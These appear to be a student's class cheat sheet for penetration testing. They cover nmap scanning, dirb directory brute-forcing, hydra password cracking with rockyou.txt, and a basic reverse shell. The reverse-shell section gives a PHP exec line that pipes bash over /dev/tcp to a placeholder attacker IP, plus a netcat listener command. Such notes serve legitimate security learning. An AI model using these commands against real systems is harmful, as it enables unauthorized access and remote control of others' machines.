[Back to Main page](README.md)

# Basic authentication and reverse shell

The basics of finding and getting into a target.

### ping \<IP adress> / \<Link>
- Pings the target, confirming if it's online or not.

## Scanning the target and basic authentication

### nmap \<IP adress>
- There are lots of modifiers, but for the class using it as `sudo nmap -sS -sV <IP adress>` is best
- if needed, `-O` is used for identifying the target machine's operating system

### dirb \<Ip Adress / Link> \<wordlist file> \<modifiers> 
- The recommended wordlist file is at `/usr/share/wordlists/dirb/common.txt`
- Some modifiers:
    - `-u <username:password>` what username and password to use if authentication is needed
    - `-x / -X` Extensions. `-x` Specifies it by file, while `-X` you can list the extensions you want used
    - `-a <agent_string>` User agent spoofing
    - `-i` Use case-insensitive Search
    - `-r` Don't search recursively
    -  `-o <output_file>` Save output to disk.
- There's also a GUI version, **dirbuster**, if preferred

### Location of rockyou.txt
- PROBABLY `/usr/share/wordlists/rockyou.txt`


### hydra
- Used for cracking basic autentication stuff, like an Apache web server
- Recommended to use it with the rockyou.txt file
- Some useful modifiers
    - `-l LOGIN` or `-L FILE`  login with LOGIN name, or load several logins from FILE
    - `-p PASS`  or `-P FILE`  try password PASS, or load several passwords from FILE
    - `-f` exit when a login/pass pair is found
- Most probably there will be a login name found somewhere, and the password will be on the top part of the rockyou.txt file, so the recommended use would be
    - `sudo hydra -l <login> -P <rockyou.txt with path> -f http://<IP adress>`
    - There's a chance a port would be needed, then `sudo hydra -l <login> -P <rockyou.txt with path> -f -s <PORT> http://<IP adress>`

## Reverse shell

This is the basic reverse shell. It is not really recommended to use this. You should use [Chained Reverse shell](crevshell.md) instead.

### Choose a port
- Usually `4444` is good and free, but if it isn't, anything free above `1024` will do

### Make a shell code
- You'll need to find a specific shell code to your usage. Google it (eg. [Something like this for PHP](https://gist.github.com/rshipp/eee36684db07d234c1cc))
- You'll need to change it so it has your ip and port you want to open baked into it
    - In this example `exec("/bin/bash -c 'bash -i > /dev/tcp/<attack machine IP adress>/<4444 or port that you prefer> 0>&1'");`

### Make a listener on the attacking machine
- Just paste this `nc -lvnp <4444 or port that you prefer>`

### SOMEHOW get this code onto the target pc and run it
- Then the target pc should link back to you via Netcat (nc)

(PHP shells are crap and **not upgradeable**)

